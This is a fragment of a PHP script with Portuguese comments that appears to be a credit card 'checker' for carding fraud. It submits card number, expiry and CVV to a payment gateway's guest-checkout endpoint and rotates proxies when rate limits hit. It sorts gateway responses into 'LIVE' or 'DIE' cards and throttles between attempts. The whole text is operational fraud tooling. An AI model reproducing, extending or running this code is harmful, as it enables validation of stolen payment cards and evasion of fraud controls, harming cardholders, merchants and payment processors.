    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data1);
setupCurlProxy($ch);

$response = curl_exec($ch);

// Decodifica a resposta para verificar
$gatewayFull = json_decode($response, true);

// Verifica se é RATE LIMIT
if (isset($gatewayFull['name']) && $gatewayFull['name'] == 'RATE_LIMIT_REACHED') {
    global $rateLimitCount;
    $rateLimitCount++;
    $waitTime = $rateLimitCount * 30;
    echo "⚠️ RATE LIMIT DETECTADO! Aguardando {$waitTime} segundos...\n";
    sleep($waitTime);
    
    // Marca proxy como ruim e tenta novamente
    markProxyAsBad($currentProxy);
    
    // Tenta novamente (recursivo)
    echo "🔄 Tentando novamente com outro proxy...\n";
    // Recarregar a página ou tentar novamente (aqui você pode chamar a função novamente)
    // Como é um script único, vamos apenas mostrar o erro e finalizar
    echo "❌ DIE ➤ " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " ➤ RATE_LIMIT ➤ BY: DOUTORDOCS ➤ ⏱️ " . (time() - $time) . "s\n";
    echo "└─ Gateway: " . json_encode($gatewayFull) . "\n";
    sleep($DELAY_BETWEEN_CARDS);
    exit;
}

// Busca o retorno CORRETAMENTE
$retorno = '';

// Verifica se existe errors
if (isset($gatewayFull['errors']) && is_array($gatewayFull['errors'])) {
    foreach ($gatewayFull['errors'] as $error) {
        if (isset($error['data']) && is_array($error['data']) && isset($error['data'][0]['code'])) {
            $retorno = $error['data'][0]['code'];
            break;
        }
        if (isset($error['message']) && empty($retorno)) {
            $retorno = $error['message'];
        }
    }
}

if (empty($retorno) && isset($gatewayFull['data']['approveGuestPaymentWithCreditCard'])) {
    $paymentData = $gatewayFull['data']['approveGuestPaymentWithCreditCard'];
    if (isset($paymentData['paymentContingencies']['threeDomainSecure']['status'])) {
        $retorno = '3DS_REQUIRED';
    } elseif (isset($paymentData['flags']['is3DSecureRequired']) && $paymentData['flags']['is3DSecureRequired'] === true) {
        $retorno = '3DS_REQUIRED';
    } elseif (isset($paymentData['cart']['intent'])) {
        $retorno = 'APPROVED';
    } else {
        $retorno = 'APPROVED';
    }
}

if (empty($retorno)) {
    $retorno = buscar($response, '"code":"', '"');
}

if (empty($retorno)) {
    $retorno = 'UNKNOWN_RESPONSE';
}

// Se retorno for vazio ou UNKNOWN, verifica se é rate limit no response bruto
if ($retorno == 'UNKNOWN_RESPONSE' && strpos($response, 'RATE_LIMIT') !== false) {
    $retorno = 'RATE_LIMIT_REACHED';
}

$lives = array(
    'INVALID_SECURITY_CODE',
    'RISK_DISALLOWED',
    'EXISTING_ACCOUNT_RESTRICTED',
    'INVALID_BILLING_ADDRESS',
    '3DS_REQUIRED',
    'APPROVED',
    'APPROVED_3DS',
    'SUCCESS',
    'is3DSecureRequired'
);

$tempoSeg = time() - $time;

if (in_array($retorno, $lives) || strpos($retorno, '3DS') !== false || strpos($retorno, 'APPROVED') !== false) {
    echo "✅ LIVE ➤ " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " ➤ " . $retorno . " ➤ BY: DOUTORDOCS ➤ ⏱️ " . $tempoSeg . "s\n";
    echo "└─ Gateway: " . json_encode($gatewayFull) . "\n";
    markProxyAsGood($currentProxy);
} else {
    echo "❌ DIE ➤ " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " ➤ " . $retorno . " ➤ BY: DOUTORDOCS ➤ ⏱️ " . $tempoSeg . "s\n";
    echo "└─ Gateway: " . json_encode($gatewayFull) . "\n";
    markProxyAsBad($currentProxy);
}

// Delay de 20 segundos
sleep($DELAY_BETWEEN_CARDS);
?>